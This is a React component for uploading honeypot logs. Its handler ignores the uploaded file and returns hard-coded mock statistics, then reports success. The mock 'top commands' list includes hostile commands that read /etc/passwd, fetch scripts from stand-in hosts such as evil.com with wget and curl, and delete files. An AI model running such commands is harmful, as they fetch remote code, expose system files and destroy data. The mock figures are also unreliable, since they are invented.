import { useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { X, Upload, FileText } from "lucide-react";
import { toast } from "sonner";

interface LogUploaderProps {
  onClose: () => void;
  onDataLoaded: (data: any) => void;
}

export const LogUploader = ({ onClose, onDataLoaded }: LogUploaderProps) => {
  const [uploading, setUploading] = useState(false);

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setUploading(true);
    
    // Simulate file processing
    setTimeout(() => {
      const mockData = {
        totalAttacks: 1247,
        uniqueIPs: 342,
        blockedAttempts: 1189,
        commandsCaptured: 2456,
        topCountries: [
          { name: "China", attacks: 437, percentage: 35 },
          { name: "Russia", attacks: 299, percentage: 24 },
          { name: "USA", attacks: 200, percentage: 16 },
          { name: "Germany", attacks: 137, percentage: 11 },
          { name: "Brazil", attacks: 100, percentage: 8 }
        ],
        topCommands: [
          { command: "ls -la", count: 234, threat: "low" },
          { command: "cat /etc/passwd", count: 189, threat: "high" },
          { command: "wget http://malicious.sh", count: 156, threat: "critical" },
          { command: "curl http://evil.com/script", count: 98, threat: "high" },
          { command: "rm -rf /tmp/*", count: 67, threat: "medium" }
        ],
        rawLog: file.name
      };
      
      onDataLoaded(mockData);
      toast.success("Logs processed successfully!");
      setUploading(false);
      onClose();
    }, 2000);
  };

  return (
    <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-50 flex items-center justify-center p-6">
      <Card className="max-w-2xl w-full p-8 bg-card border-glow relative">
        <Button
          variant="ghost"
          size="icon"
          className="absolute top-4 right-4"
          onClick={onClose}
        >
          <X className="w-5 h-5" />
        </Button>

        <div className="text-center space-y-6">
          <div className="relative inline-block">
            <FileText className="w-20 h-20 text-primary mx-auto" />
            <div className="absolute inset-0 blur-2xl bg-primary/30 animate-pulse" />
          </div>

          <div>
            <h2 className="text-3xl font-bold text-gradient-cyber mb-2">
              Upload Honeypot Logs
            </h2>
            <p className="text-muted-foreground">
              Support for cmd_audits.log, creds_audits.log, and http_audit.log
            </p>
          </div>

          <div className="border-2 border-dashed border-border rounded-lg p-12 hover:border-primary/50 transition-colors">
            <input
              type="file"
              id="file-upload"
              className="hidden"
              accept=".log,.txt"
              onChange={handleFileUpload}
              disabled={uploading}
            />
            <label htmlFor="file-upload" className="cursor-pointer">
              <Upload className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
              <p className="text-sm text-muted-foreground mb-2">
                Click to upload or drag and drop
              </p>
              <p className="text-xs text-muted-foreground">
                .log or .txt files
              </p>
            </label>
          </div>

          {uploading && (
            <div className="text-sm text-muted-foreground">
              Processing logs...
            </div>
          )}
        </div>
      </Card>
    </div>
  );
};
